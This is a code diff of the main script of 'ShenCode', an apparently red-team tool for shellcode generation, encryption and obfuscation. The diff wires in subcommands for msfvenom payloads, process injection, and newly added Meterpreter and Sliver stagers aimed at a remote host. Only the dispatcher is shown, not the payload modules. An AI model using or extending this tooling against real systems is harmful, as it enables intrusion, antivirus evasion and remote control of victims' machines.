@@ -1,25 +1,38 @@
 import os
 
-import utils.arg as arg
+from utils.args import parse_arguments
 from utils.helper import nstate as nstate
 from utils.helper import FileCheck
-import utils.extract as extract
-import utils.formatout as formatout
 import utils.hashes as hashes
 import utils.header
-if os.name == 'nt':
-  import utils.injection as injection
-import utils.msf as msf
-import encoder.aes as aes
-import encoder.byteswap as byteswap
-import encoder.xorpoly as xorpoly
-import encoder.xor as xor
-import obfuscator.feed as feed
-import obfuscator.qrcode as qrcode
-import obfuscator.rolhash as rolhash
-import obfuscator.uuid as uuid
 
-Version = '0.6.1'
+## Migrate Mods
+import modules.aes as aes
+import modules.bytebert as bytebert
+import modules.byteswap as byteswap
+import modules.extract as extract
+import modules.feed as feed
+import modules.formatout as formatout
+import utils.helper
+if os.name == 'nt':
+  import modules.injection as injection
+  import modules.meterpreter as meterpreter
+import modules.msfvenom as msf
+import modules.qrcode as qrcode
+if os.name == 'nt':
+  import modules.rolhash as rolhash
+  import modules.sliver as sliver
+import modules.uuid as uuid
+import modules.xor as xor
+import modules.xorpoly as xorpoly
+
+Version = '0.7.0'
+banner = 0
+
+print(f"{nstate.HEADER}")
+print(f'{utils.header.get_header(banner)}')
+print(f'Version {Version} by psycore8 -{nstate.ENDC} {nstate.TextLink('https://www.nosociety.de')}\n')
+arguments = parse_arguments()
 
 # make sure your metasploit binary folder is in your PATH variable
 if os.name == 'nt':
@@ -30,43 +43,27 @@ elif os.name == 'posix':
   tpl_path = 'tpl/'
   
 def main(command_line=None):
+
   print(f"{nstate.HEADER}")
   print(f'{utils.header.get_header()}')
   print(f'Version {Version} by psycore8 -{nstate.ENDC} {nstate.TextLink('https://www.nosociety.de')}')
-
-
-  ##########################
-  ### BEGIN INIT SECTION ###
-  ##########################
-
-  arg.CreateMainParser()
-  aes.aes_encoder.init()
-  byteswap.xor.init()
-  extract.extract_shellcode.init()
-  formatout.format.init()
-  if os.name == 'nt':
-    injection.inject.init()
-  msf.msfvenom.init()
-  feed.feed_obfuscator.init()
-  qrcode.qrcode_obfuscator.init()
-  if os.name == 'nt':
-    rolhash.ror2rol_obfuscator.init()
-  uuid.uuid_obfuscator.init()
-  xorpoly.xor.init()
-  xor.xor_encoder.init()
-  arguments = arg.ParseArgs(command_line)
-
-  ##########################
-  #### END INIT SECTION ####
-  ##########################
-  
-
-  # MAIN
 
   if arguments.command == 'msfvenom':
     print(f"{nstate.OKBLUE} create payload")
     cs = msf.msfvenom(arguments.cmd)
     cs.CreateShellcodeEx(msfvenom_path)
+
+  elif arguments.command == 'meterpreter':
+    stager = meterpreter.stage(arguments.remote_host, arguments.port, arguments.timeout, arguments.arch, arguments.sleep)
+    stager.process()
+
+  elif arguments.command == 'sliver':
+    stager = sliver.stage(arguments.remote_host, arguments.port)
+    stager.process()
+
+  elif arguments.command == 'bytebert':
+    bb = bytebert.bb_encoder(arguments.input, arguments.output, arguments.variable_padding)
+    bb.process()
 
   elif arguments.command == 'xorpoly':
     poly = xorpoly.xor(arguments.input, arguments.output, b'', b'', f'{tpl_path}xor-stub.tpl', arguments.key)
@@ -100,7 +97,7 @@ def main(command_line=None):
     for string in outstrings:
       print(f'{string}')
 
-  elif arguments.command == 'aesenc':
+  elif arguments.command == 'aes':
     aes_enc = aes.aes_encoder(arguments.mode, arguments.input, arguments.output, arguments.key, b'')
     print(f'{nstate.OKBLUE} [AES] Module')
     aes_enc.key = aes_enc.key.encode('utf-8')
@@ -187,7 +184,7 @@ def main(command_line=None):
         print(f"{nstate.OKGREEN} Output written in buf {fout.write_out}")
       print(f"{nstate.OKGREEN} DONE!")
 
-  elif arguments.command == 'ror2rol':
+  elif arguments.command == 'rolhash':
       r2l = rolhash.ror2rol_obfuscator(arguments.input, arguments.output, arguments.key)
       filecheck, outstrings = FileCheck.CheckSourceFile(r2l.input_file, 'ROR2ROL')
       for string in outstrings:
@@ -204,7 +201,7 @@ def main(command_line=None):
       for string in outstrings:
         print(f'{string}')
 
-  elif arguments.command == 'xorenc':
+  elif arguments.command == 'xor':
       xor_encoder = xor.xor_encoder(arguments.input, arguments.output, arguments.key)
       print(f"{nstate.OKBLUE} Reading shellcode")
       filecheck, outstrings = FileCheck.CheckSourceFile(xor_encoder.input_file, 'XOR-ENC')
@@ -224,8 +221,8 @@ def main(command_line=None):
       if not filecheck:
         exit()
 
-  elif arguments.command == 'inject':
-    code_injection = injection.inject(arguments.input, arguments.start, arguments.process, '')
+  elif arguments.command == 'injection':
+    code_injection = injection.inject(arguments.input, arguments.start, arguments.process, '', arguments.resume_thread, arguments.virtual_protect)
     print(f"{nstate.OKBLUE} Reading shellcode")
     filecheck, outstrings = FileCheck.CheckSourceFile(code_injection.input_file, 'iNJECT')
     for strings in outstrings:
@@ -252,4 +249,10 @@ def main(command_line=None):
     print(f'ShenCode {Version}')
 
 if __name__ == "__main__":
-  main()
+    # if arguments.banner > 0:
+    #   print(f'{arguments.banner}')
+    #   banner = arguments.banner
+
+    #utils.helper.FirstRun.CheckFirstRunState()
+    #print(args)
+    main()
